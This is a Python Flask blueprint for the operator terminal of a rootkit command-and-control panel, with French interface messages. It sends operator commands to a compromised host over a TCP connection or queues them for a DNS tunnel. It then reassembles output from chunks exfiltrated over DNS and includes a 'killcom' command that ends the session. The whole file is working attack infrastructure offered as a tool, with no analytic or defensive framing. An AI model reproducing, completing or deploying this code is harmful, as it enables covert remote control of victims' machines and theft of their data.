from flask import Blueprint, render_template, redirect, request, url_for
import utils.state as state
from utils.socket_comm import send_to_server, receive_from_server
import socket
import time

terminal_bp = Blueprint('terminal', __name__)

@terminal_bp.route('/')
def terminal():
    if not state.authenticated:
        return redirect(url_for('auth.login'))
    return render_template("terminal.html", response=state.last_response, history=state.command_history, last_channel=state.last_channel)

@terminal_bp.route('/send', methods=['POST'])
def send_command():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    channel = request.form.get('channel', 'tcp')
    state.last_channel = channel
    cmd = request.form.get('command', '').strip()
    if not cmd:
        return redirect(url_for('terminal.terminal'))

    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
    state.command_history.append(command_entry)

    if channel == 'dns':
        state.command_queue.append(cmd)
        state.last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}
        text = _assemble_exfil()
        if text:
            state.last_response = {"stdout": text, "stderr": ""}
            command_entry["stdout"] = text
        else:
            state.last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
            command_entry["stderr"] = state.last_response["stderr"]
    else:
        try:
            with state.connection_lock:
                send_to_server(state.rootkit_connection, cmd)
                if 'killcom' in cmd.lower():
                    state.rootkit_connection.close()
                    state.last_response = {"stdout": "", "stderr": "Connexion terminée."}
                    return redirect(url_for('dashboard.dashboard'))

                chunks = []
                state.rootkit_connection.settimeout(1)
                while True:
                    try:
                        part = receive_from_server(state.rootkit_connection)
                        if not part:
                            break
                        chunks.append(part)
                    except socket.timeout:
                        break
                state.rootkit_connection.settimeout(None)

                response = ''.join(chunks)

                if "stdout:" in response and "stderr:" in response:
                    stdout_content = response.split("stderr:")[0].split("stdout:")[1].strip()
                    stderr_content = response.split("stderr:")[1].strip()
                    state.last_response = {"stdout": stdout_content, "stderr": stderr_content}
                    command_entry["stdout"] = stdout_content
                    command_entry["stderr"] = stderr_content
                else:
                    state.last_response = {"stdout": response.strip(), "stderr": ""}
                    command_entry["stdout"] = response.strip()

        except Exception as e:
            state.last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}

    return redirect(url_for('terminal.terminal'))

def _assemble_exfil(timeout=state.DNS_RESPONSE_TIMEOUT, poll=state.DNS_POLL_INTERVAL):
    start = time.time()
    while True:
        if state.expected_chunks is not None and len(state.exfil_buffer) >= state.expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if state.expected_chunks is not None and len(state.exfil_buffer) >= state.expected_chunks:
        data = b''.join(state.exfil_buffer[i] for i in range(state.expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    state.expected_chunks = None
    state.exfil_buffer.clear()
    return text
